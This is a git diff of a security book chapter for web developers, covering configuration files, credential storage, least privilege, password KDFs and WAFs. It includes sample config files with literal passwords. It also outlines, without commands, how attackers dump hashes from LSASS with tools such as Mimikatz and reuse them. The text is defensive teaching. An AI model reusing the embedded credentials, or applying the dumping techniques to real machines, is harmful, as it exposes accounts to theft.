+    |  +-- devbox2-development.js
+    |  |
+    |  +-- stagingbox-staging.js
+    |  |
+    |  +-- prodbox-production.js
+    |  |
+    |  +-- local.js (creted by build)
+    |
+    +-- routes
+    |  |
+    |  +-- home.js
+    |  |
+    |  +-- ...
+    |
+    +-- app.js (entry point)
+    |
+    +-- ...
+
 
 The contents of the above example configuration files may look like the following:
 
-{title="default.js", linenos=off, lang=js}
-~~~~~~~~
-module.exports = {
-   enquiries: {
-      // Supported services: https://github.com/andris9/nodemailer-wellknown#supported-services
-      // supported-services actually use the best security settings by default. I tested this with a wire capture, because it's always the most fool proof way.
-      service: 'FastMail',
-      email: 'yourusername@fastmail.com',
-      user: 'yourusername',
-      pass: null
-   }
-   // Lots of other settings.
-   // ...
-}
-~~~~~~~~
+{title="default.js", linenos=off, lang=JavaScript}
+    module.exports = {
+       enquiries: {
+          // Supported services:
+          // https://github.com/andris9/nodemailer-wellknown#supported-services
+          // supported-services actually use the best security settings by default.
+          // I tested this with a wire capture, because it is always the most fool proof way.
+          service: 'FastMail',
+          email: 'yourusername@fastmail.com',
+          user: 'yourusername',
+          pass: null
+       }
+       // Lots of other settings.
+       // ...
+    }
 
-{title="devbox1-development.js", linenos=off, lang=js}
-~~~~~~~~
-module.exports = {
-   enquiries: {
-      // Test password for developer on devbox1
-      pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
-   }
-}
-~~~~~~~~
+{title="devbox1-development.js", linenos=off, lang=JavaScript}
+    module.exports = {
+       enquiries: {
+          // Test password for developer on devbox1
+          pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
+       }
+    }
 
-{title="devbox2-development.js", linenos=off, lang=js}
-~~~~~~~~
-module.exports = {
-   enquiries: {
-      // Test password for developer on devbox2
-      pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
-   }
-}
-~~~~~~~~
+{title="devbox2-development.js", linenos=off, lang=JavaScript}
+    module.exports = {
+       enquiries: {
+          // Test password for developer on devbox2
+          pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
+       }
+    }
 
-{title="stagingbox-staging.js", linenos=off, lang=js}
-~~~~~~~~
-{}
-~~~~~~~~
+{title="stagingbox-staging.js", linenos=off, lang=JavaScript}
+    {}
 
-{title="prodbox-production.js", linenos=off, lang=js}
-~~~~~~~~
-{}
-~~~~~~~~
+{title="prodbox-production.js", linenos=off, lang=JavaScript}
+    {}
 
-{title="local.js", linenos=off, lang=js}
-~~~~~~~~
-// Build creates this file.
-module.exports = {
-   enquiries: {
-      // Password created by the build.
-      pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
-   }
-}
-~~~~~~~~
+{title="local.js", linenos=off, lang=JavaScript}
+    // Build creates this file.
+    module.exports = {
+       enquiries: {
+          // Password created by the build.
+          pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
+       }
+    }
 
 The [Logging](#web-applications-countermeasures-logging) section shows more configuration options to provide a slightly bigger picture.
 
 node-config also:
+
 * Provides command line overrides, thus allowing you to override configuration values at application start from command
-* Allows for the overriding of environment variables with custom environment variables from a `custom-environment-variables.json` file
+* Allows for the overriding of environment variables with [custom environment variables](https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables) from a `custom-environment-variables.json` file
 
 &nbsp;
 
@@ -589,39 +596,42 @@ There are different answers for different platforms. None of which provide compl
 
 ##### Windows 
 
-Store database credentials as a Local Security Authority (LSA) secret and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`
+**Store database credentials as a Local Security Authority (LSA) secret** and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`
 
-The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed from the wire in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (LSASS.exe)) using tools such as Mimikatz, WCE, hashdump or fgdump. An attacker generally only needs the hash. Trusted tools like psexec take care of this for us. All discussed in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 
+The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed [from the wire](#network-identify-risks-wire-inspecting) in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (LSASS.exe)) using tools such as Mimikatz, WCE, hashdump or fgdump. An attacker generally only needs the hash. Trusted tools like psexec take care of this for us. All discussed in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 
 
 &nbsp;
 
-Encrypt sections of a web, executable, machine-level, application-level or configuration files with Aspnet_regiis.exe with the `-pe` option and name of the configuration element to encrypt and the configuration provider you want to use. Either DataProtectionConfigurationProvider (uses DPAPI) or RSAProtectedConfigurationProvider (uses RSA). the `-pd` switch is used to decrypt or programatically: `string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`
+**Encrypt sections** of a web, executable, machine-level, application-level configuration files with `aspnet_regiis.exe` with the `-pe` option and name of the configuration element to encrypt and the configuration provider you want to use. Either `DataProtectionConfigurationProvider` (uses DPAPI) or `RSAProtectedConfigurationProvider` (uses RSA). the `-pd` switch is used to decrypt or programatically:  
+`string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`
 
-Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the RSAProtectedConfigurationProvider has been used, a key container is required. Mimikatz will force an export from the key container to a .pvk file.
+Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the `RSAProtectedConfigurationProvider` has been used, a key container is required. Mimikatz will force an export from the key container to a `.pvk` file.
 Which can then be [read](http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container) using OpenSSL or tools from the Mono.Security assembly
 
 &nbsp;
 
-I've looked at a few other ways using PSCredential and SecureString. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.
+I have looked at a few other ways using `PSCredential` and `SecureString`. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.
 
 &nbsp;
 
-[Credential Guard](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user [task is isolated](http://security.stackexchange.com/questions/23674/how-will-microvirtualisation-change-the-security-field-if-at-all) into it's own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what's to stop malicious code doing the same? I've seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.
+[**Credential Guard**](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.
 
 "_Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents_"
 
 "_vSentry protects desktops without requiring patches or updates, defeating and
 automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"
 
+This is marketing talk. Please don't take this literally.
+
 "_vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise_"
 
 "_Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user._"
+
 > Bromium
-http://www.bromium.com/sites/default/files/Bromium-Datasheet-vSentry.pdf
 
 "_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"
+
 > Bromium
-http://www.ervik.as/virtualization-community/groups/display?categoryid=11
 
 These seem like bold claims.
 
@@ -629,49 +639,61 @@ Also worth considering is that Microsofts new virtualization-based security also
 
 ##### Linux
 
-Using Linux Containers also help to provide some form of isolation. Allowing you to only have the user accounts to do what's necessary for the application.
+**Containers** also help to provide some form of isolation. Allowing you to only have the user accounts to do what is necessary for the application.
 
-I usually use a deployment tool that also changes the permissions and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you're using Linux Containers then you can reduce this even more if it isn't already.
+I usually use a **deployment tool that also changes the permissions** and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you are using Linux Containers then you can reduce this even more if it is not already.
 
-One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you don't know what you want, then someone else will probably take that control from you. It's just a matter of time.
+One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn't happened already.
 
 #### Least Privilege
+![](images/ThreatTags/PreventionEASY.png)
 
-An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only providing permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they won't be able to do a lot anyway.
+An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only provide permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they will not be able to do a lot anyway.
 
 #### Location
+![](images/ThreatTags/PreventionEASY.png)
 
-Put your services like data-stores on network segments that are as [sheltered](#network-identify-risks-component-placement) as possible and only contain similar services.
+Put your services like data-stores on network segments that are as [sheltered](#network-countermeasures-component-placement) as possible and only contain similar services.
 
 Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. 
 
 #### Data-store Compromise
+![](images/ThreatTags/PreventionEASY.png)
 
-As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it doesn't. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?
+As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?
 
-Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It's also worth considering pushing the use of high quality password databases. Do not limit password lengths. Encourage long passwords.
+As part of developing the application that uses the data-store, a strategy also needs to be developed and implemented to carry on business as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the machine(s) that host your data-store, as well as the usual alerts being fired off to the people that are going to investigate and audit, your application should take some automatic measures like:
 
-PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html) are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map <credential> → <protected form> must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"
+* All following logins should be instructed to change passwords
+
+If you follow the recommendations below, data-store theft will be an inconvenience, but not a disaster.
+
+Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage long passwords.
+
+PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html) are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map_" `<credential> → <protected form>` "_must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"
+
 > OWASP Password Storage
 
 PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or HMAC to the data being received along with a unique salt. The salt should be stored with the hashed data.
 
-Don't use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact don't use hashing functions at all for this unless they're leveraged with one of the mentioned KDFs. Why? Because the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
+Do not use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. Why? Because the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
 "_Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm._"
+
 > Per Thorsheim
 
-In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt doesn't have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else
+In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else
 
-Which to use?
+**Which to use?**
 
-This depends on many considerations. I'm not going to tell you which is best, because there isn't a best. Which to use depends on many things. You're going to have to gain understanding into at least all three KDF's. PBKDF2 is the oldest so it's the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two. The next oldest is bcrypt which uses the Eksblowfish cipher which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPU's of the day (1999). The hashing functions that PBKDF2 uses were a lot easier to get speed increases due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as: far greater memory required for each hash, small and frequent pseudo-random memory accesses, making it harder to cache the data into faster memory. Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as:
+This depends on many considerations. I am not going to tell you which is best, because there is no best. Which to use depends on many things. You are going to have to gain understanding into at least all three KDFs. PBKDF2 is the oldest so it is the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two. The next oldest is bcrypt which uses the Eksblowfish cipher which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999). The hashing functions that PBKDF2 uses were a lot easier to get speed increases due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as: far greater memory required for each hash, small and frequent pseudo-random memory accesses, making it harder to cache the data into faster memory. Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as:
+
 * [Parallella board](https://www.parallella.org/board/) with Epiphany chip
 * [ZedBoard / Zynq 7020](http://picozed.org/product/zedboard)
 * [Xeon+FPGA](http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost)
 * [Xeon Phi](http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi)
 * [Haswell](http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/)
 
-The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed, feed with the data you want protected and a salt. All good frameworks will have at least PBKDF2 and bcrypt API's 
+The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed. Feed with the data you want protected and a salt. All good frameworks will have at least PBKDF2 and bcrypt APIs
 
 ### Logging {#web-applications-countermeasures-logging}
 
@@ -690,7 +712,7 @@ _Todo_
 ### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
 ![](images/ThreatTags/PreventionEASY.png)
 
-Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I'll attempt to paraphrase some of them here:
+Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:
 
 * Implement process and governance around which open source libraries you can use
 * Legal review: checking licenses
@@ -698,9 +720,9 @@ Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-dev
 * Maintain a list containing all the libraries that have been approved for use.  
 If not on the list, make request and it should go through the same process.
 * Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house.  
-* There needs to be automated process that runs over the code base to check that nothing that's not on the approved list is included.
+* There needs to be automated process that runs over the code base to check that nothing that is not on the approved list is included.
 
-There's an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
+There is an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
 for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305) that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries
 
 For NodeJS developers: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories)
@@ -718,14 +740,14 @@ For .Net developers, there is the likes of [OWASP **SafeNuGet**](https://github.
 
 ### Web Application Firewall (WAF) {#web-applications-countermeasures-waf}
 
-[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that don't exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through it's interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they haven't seen before like responses containing larger than specified payloads. Source code of the web application does not have to be modified.
+[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they have not seen before like responses containing larger than specified payloads. Source code of the web application does not have to be modified.
 
-1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there hasn't been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
+1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there has not been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
 2. [express-waf](https://www.npmjs.com/package/express-waf) has recent commits, but there is only a single developer working on it when I checked.
 3. [AppSensor](http://appsensor.org/) brings detection -> prevention to your domain level.
   Most applications today just take attacks & fall over.
-  I've heard so many times we want our applications to fail securely when they get bad input.
-  We don't want our applications being bullied and failing securely.
+  I have heard so many times we want our applications to fail securely when they get bad input.
+  We do not want our applications being bullied and failing securely.
   We want them to not fail at all in production, but rather defend themselves.
  
   Technically AppSensor is not a WAF because the concepts are used to shape your application logic.
@@ -739,7 +761,15 @@ For .Net developers, there is the likes of [OWASP **SafeNuGet**](https://github.
   * more than a dozen response actions are described.
 
 ## 4. SSM Risks that Solution Causes
-> Are there any? If so what are they?
+
+### Lack of Visibility
+
+_Todo_
+
 
 ## 5. SSM Costs and Trade-offs
-> An exercise for the reader. What are they?
+
+### Lack of Visibility
+
+_Todo_
+
